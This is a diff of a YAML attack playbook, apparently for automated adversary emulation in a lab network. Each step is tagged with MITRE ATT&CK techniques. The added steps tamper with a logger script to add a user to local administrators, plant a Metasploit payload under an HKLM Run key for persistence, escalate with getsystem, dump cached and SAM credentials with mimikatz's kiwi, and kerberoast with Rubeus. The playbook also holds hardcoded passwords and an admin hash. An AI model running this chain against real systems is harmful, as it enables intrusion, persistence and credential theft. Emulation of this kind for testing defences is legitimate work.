@@ -4,6 +4,7 @@ vars:
   COMPROMISED_USER_PASSWORD: Pa$$w0rd
   COMPROMISED_ADMIN_USERNAME: "wsadmin"
   COMPROMISED_ADMIN_PASSWORD: "Root.PW1"
+  COMPROMISED_ADMIN_HASH: "20f4829ff2880daba668aeac071b73db"
   IP_KALI: 10.10.10.200
   IP_WEB: 10.10.10.10
   IP_DC1: 10.0.0.10
@@ -14,12 +15,24 @@ commands:
   - type: shell
     cmd: "evil-winrm -i $IP_WEB -u $COMPROMISED_USER_USERNAME -p '$COMPROMISED_USER_PASSWORD'\n"
     command_timeout: 30
-    interactive: true
     creates_session: winrm
+    interactive: true
     metadata:
       techniques: "T1021.006,T1047"
       tactics: "Lateral Movement"
       technique_name: "Remote Services: Windows Remote Management"
+
+  - type: shell
+    session: winrm
+    interactive: true
+    cmd: "Add-Content -Path \"C:\\Scripts\\Logger.ps1\" -Value \"net localgroup administrators alice /add\"\n"
+    metadata:
+      techniques: "T1053.005,T1547"
+      tactics: "Execution, Persistence, Privilege Escalation"
+      technique_name: "Scheduled Task/Job: Scheduled Task"
+
+  - type: sleep
+    seconds: 60
 
   - type: msf-payload
     cmd: $MSF_PAYLOAD
@@ -31,13 +44,22 @@ commands:
 
   - type: shell
     session: winrm
-    cmd: "mkdir C:\\\\Temp\n"
     interactive: true
+    cmd: "mkdir C:\\\\Temp\n"
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS_DIR/msf.exe C:\\\\Temp\\\\msf.exe\n"
     interactive: true
+    cmd: "upload $PAYLOADS_DIR/msf.exe C:\\\\Temp\\\\msf.exe\n"
+
+  - type: shell
+    session: winrm
+    interactive: true
+    cmd: "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Persistence\" -Value \"C:\\Temp\\msf.exe\" -PropertyType \"String\" -Force\n"
+    metadata:
+      techniques: "T1547.001"
+      tactics: "Persistence, Privilege Escalation"
+      technique_name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
 
   - type: msf-module
     creates_session: msfshell
@@ -51,8 +73,16 @@ commands:
 
   - type: shell
     session: winrm
-    cmd: "C:\\\\Temp\\\\msf.exe\n"
     interactive: true
+    cmd: "C:\\\\Temp\\\\msf.exe\n"
+
+  - type: msf-session
+    session: msfshell
+    cmd: getuid
+
+  - type: msf-session
+    session: msfshell
+    cmd: getsystem
 
   - type: msf-session
     session: msfshell
@@ -65,14 +95,6 @@ commands:
   - type: setvar
     cmd: $RESULT_STDOUT
     variable: $LSASS_PID
-
-  - type: msf-session
-    session: msfshell
-    cmd: getsystem
-
-  - type: msf-session
-    session: msfshell
-    cmd: getuid
 
   - type: msf-session
     session: msfshell
@@ -105,7 +127,31 @@ commands:
       tactics: "Credential Access"
       technique_name: "OS Credential Dumping: LSASS Memory"
 
-  - type: regex
-    cmd: ".*NTLM.*:(.*)"
-    output:
-      NTLM: "$MATCH_0"
+  - type: msf-session
+    session: msfshell
+    cmd: "kiwi_cmd \"lsadump::cache\""
+    metadata:
+      techniques: "T1003.005"
+      tactics: "Credential Access"
+      technique_name: "OS Credential Dumping: Cached Domain Credentials"
+
+  - type: msf-session
+    session: msfshell
+    cmd: "kiwi_cmd \"lsadump::sam\""
+    metadata:
+      techniques: "T1003.002"
+      tactics: "Credential Access"
+      technique_name: "OS Credential Dumping: Security Account Manager"
+
+  - type: shell
+    session: winrm
+    interactive: true
+    cmd: "upload $PAYLOADS_DIR/Rubeus.exe C:\\\\Temp\\\\Rubeus.exe\n"
+
+  - type: msf-session
+    session: msfshell
+    cmd: "execute -f C:\\\\Temp\\\\Rubeus.exe -a \"kerberoast /nowrap\" -i"
+    metadata:
+      techniques: "T1558.003"
+      tactics: "Credential Access"
+      technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
